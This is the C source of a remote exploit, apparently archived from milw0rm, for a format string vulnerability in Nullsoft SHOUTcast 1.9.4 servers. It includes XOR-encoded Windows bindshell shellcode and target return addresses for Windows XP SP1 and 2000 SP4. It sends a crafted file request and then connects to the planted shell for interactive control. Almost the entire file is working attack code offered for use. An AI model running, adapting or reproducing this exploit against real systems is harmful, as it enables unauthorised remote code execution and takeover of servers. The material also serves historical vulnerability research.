/*

Object:		PoC for Nullsoft SHOUTcast 1.9.4 File Request Format String Vulnerability

From the securityfocus bid at http://www.securityfocus.com/bid/12096 :
"This issue was reported to exist in version 1.9.4 on Linux. It is likely that versions for other
platforms are also affected by the vulnerability, though it is not known to what degree they are
exploitable."

This is now clarified, it's exploitable.

notes:		This is a two steps exploitation: the format bug is used to compute a buffer
			that will overwrite the stack later, resulting in a SEH overwriting.
			The exploit works for both the GUI and the console servers.
greets:		Sputnik
`date`:		Sat Feb 19 15:48:45     2005
credits:	Tomasz Trojanowski
author:		mandragore, mandragore@turingtest@gmail.com

Disclaimer:
This exploit is not to be published on any french site, including k-otic.com, because of the law
against vulnerability research (the LEN). We all know what security through obscurity means,
but I don't make the laws.

*/

#include <stdio.h>
#include <strings.h>
#include <signal.h>
#include <netinet/in.h>
#include <netdb.h>

#define NORM  "\033[00;00m"
#define GREEN "\033[01;32m"
#define YELL  "\033[01;33m"
#define RED   "\033[01;31m"

#define BANNER GREEN "[%%] " YELL "mandragore's sploit v1.0 for " RED "shoutcast 1.9.4 (win gui & console)" NORM

#define fatal(x) { perror(x); exit(1); }

#define default_port 8000

struct { char *os; long goreg; long gpa; long lla; }
targets[] = {
	{ "wXP SP1     ", 0x77beeb23, 0x77be10cc, 0x77be10D0 },	// msvcrt.dll's
	{ "w2k SP4 many", 0x7801D081, 0x780320cc, 0x780320d0 },
 }, tsz;

unsigned char bsh[]={
// 198 bytes, iat's gpa at 0x1a, iat's lla at 0x2b, port at 0x46 (1180), key 0xde
0xEB,0x0F,0x8B,0x34,0x24,0x33,0xC9,0x80,0xC1,0xB0,0x80,0x36,0xDE,0x46,0xE2,0xFA,
0xC3,0xE8,0xEC,0xFF,0xFF,0xFF,0xBA,0x57,0xD7,0x60,0xDE,0xFE,0x9E,0xDE,0xB6,0xED,
0xEC,0xDE,0xDE,0xB6,0xA9,0xAD,0xEC,0x81,0x8A,0x21,0xCB,0xDA,0xFE,0x9E,0xDE,0x49,
0x47,0x8C,0x8C,0x8C,0x8C,0x9C,0x8C,0x9C,0x8C,0xB4,0x90,0x89,0x21,0xC8,0x21,0x0E,
0x4D,0xB4,0xDE,0xB6,0xDC,0xDE,0xDA,0x42,0x55,0x1A,0xB4,0xCE,0x8E,0x8D,0xB4,0xDC,
0x89,0x21,0xC8,0x21,0x0E,0xB4,0xDF,0x8D,0xB4,0xD3,0x89,0x21,0xC8,0x21,0x0E,0xB4,
0xDE,0x8A,0x8D,0xB4,0xDF,0x89,0x21,0xC8,0x21,0x0E,0x55,0x06,0xED,0x1E,0xB4,0xCE,
0x87,0x55,0x22,0x89,0xDD,0x27,0x89,0x2D,0x75,0x55,0xE2,0xFA,0x8E,0x8E,0x8E,0xB4,
0xDF,0x8E,0x8E,0x36,0xDA,0xDE,0xDE,0xDE,0xBD,0xB3,0xBA,0xDE,0x8E,0x36,0xD1,0xDE,
0xDE,0xDE,0x9D,0xAC,0xBB,0xBF,0xAA,0xBB,0x8E,0xAC,0xB1,0xBD,0xBB,0xAD,0xAD,0x9F,
0xDE,0x18,0xD9,0x9A,0x19,0x99,0xF2,0xDF,0xDF,0xDE,0xDE,0x5D,0x19,0xE6,0x4D,0x75,
0x75,0x75,0xBA,0xB9,0x7F,0xEE,0xDE,0x55,0x9E,0xD2,0x55,0x9E,0xC2,0x55,0xDE,0x21,
0xAE,0xD6,0x21,0xC8,0x21,0x0E
};

char verbose=0;

void setoff(long GPA, long LLA) {
	int gpa=GPA^0xdededede, lla=LLA^0xdededede;
	memcpy(bsh+0x1a,&gpa,4);
	memcpy(bsh+0x2b,&lla,4);
}

void usage(char *argv0) {
	int i;

	printf("%s -d <host/ip> [opts]\n\n",argv0);

	printf("Options:\n");
	printf(" -h undocumented\n");
	printf(" -v verbose mode on\n");
	printf(" -p <port> to connect to [default: %u]\n",default_port);
	printf(" -P <port> for the shellcode [default: 1180]\n");
	printf(" -t <target type>; choose below [default: 0]\n\n");

	printf("Types:\n");
	for(i = 0; i < sizeof(targets)/sizeof(tsz); i++)
		printf(" %d %s\t[0x%.8x]\n", i, targets[i].os, targets[i].goreg);

	exit(1);
}

void shell(int s) {
	char buff[4096];
	int retval;
	fd_set fds;

	printf("[+] connected!\n\n");

	for (;;) {
		FD_ZERO(&fds);
		FD_SET(0,&fds);
		FD_SET(s,&fds);

        if (select(s+1, &fds, NULL, NULL, NULL) < 0)
			fatal("[-] shell.select()");

		if (FD_ISSET(0,&fds)) {
			if ((retval = read(1,buff,4096)) < 1)
				fatal("[-] shell.recv(stdin)");
			send(s,buff,retval,0);
		}

		if (FD_ISSET(s,&fds)) {
			if ((retval = recv(s,buff,4096,0)) < 1)
				fatal("[-] shell.recv(socket)");
			write(1,buff,retval);
		}
	}
}

int main(int argc, char **argv, char **env) {
	struct sockaddr_in sin;
	struct hostent *he;
	char *host; int port=default_port;
	char *Host; int Port=1180; char bindopt=1;
	int i,s,ptr=0;
	int type=0;
	char *buff;

	printf(BANNER "\n");

	if (argc==1)
		usage(argv[0]);

	for (i=1;i<argc;i+=2) {
		if (strlen(argv[i]) != 2)
			usage(argv[0]);
		// chk nulls argv[i+1]
		switch(argv[i][1]) {
			case 't':
				type=atoi(argv[i+1]);
				if (type >= (sizeof(targets)/sizeof(tsz))) {
					printf("[-] bad target\n");
					usage(argv[0]);
				}
				break;
			case 'd':
				host=argv[i+1];
				break;
			case 'p':
				port=atoi(argv[i+1])?:default_port;
				break;
			case 's':
				if (strstr(argv[i+1],"rev"))
					bindopt=0;
				break;
			case 'H':
				Host=argv[i+1];
				break;
			case 'P':
				Port=atoi(argv[i+1])?:1180;
				Port=Port ^ 0xdede;
				Port=(Port & 0xff) << 8 | Port >>8;
				memcpy(bsh+0x46,&Port,2);
				Port=Port ^ 0xdede;
				Port=(Port & 0xff) << 8 | Port >>8;
				break;
			case 'v':
				verbose++; i--;
				break;
			case 'h':
				usage(argv[0]);
			default:
				usage(argv[0]);
			}
	}

	if (verbose)
		printf("verbose!\n");

	if ((he=gethostbyname(host))==NULL)
		fatal("[-] gethostbyname()");

	sin.sin_family = 2;
	sin.sin_addr = *((struct in_addr *)he->h_addr_list[0]);
	sin.sin_port = htons(port);

	printf("[.] launching attack on %s:%d..\n",inet_ntoa(*((struct in_addr *)he->h_addr_list[0])),port);
	printf("[.] will try to put a bindshell on port %d.\n",Port);

// --------------------  core

	s=socket(2,1,6);

	if (connect(s,(struct sockaddr *)&sin,16)!=0)
		fatal("[-] connect()");

	printf("[+] connected, sending exploit\n");

	buff=(char *)malloc(4096);
	bzero(buff,4096);

	setoff(targets[type].gpa, targets[type].lla);

	ptr=sprintf(buff,"GET /content/%%#0%ux",1046-sizeof(bsh));
	memcpy(buff+ptr,bsh,sizeof(bsh)); ptr+=sizeof(bsh);
	strcpy(buff+ptr,"\xeb\x06\x41\x41"); ptr+=4;		// jump forward
	memcpy(buff+ptr,&targets[type].goreg,4); ptr+=4;	// ret off
	strcpy(buff+ptr,"\xe9\x2d\xff\xff\xff"); ptr+=5;	// jump backward
	strcpy(buff+ptr,"%#0200x.mp3 HTTP/1.0\r\n\r\n"); ptr+=28;

	send(s,buff,ptr,0);

	free(buff);

	close(s);

// --------------------  end of core

	sin.sin_port = htons(Port);
	sleep(2);
	s=socket(2,1,6);
	if (connect(s,(struct sockaddr *)&sin,16)!=0)
		fatal("[-] exploit most likely failed");
	shell(s);

	exit(0);
}


// milw0rm.com [2005-02-19]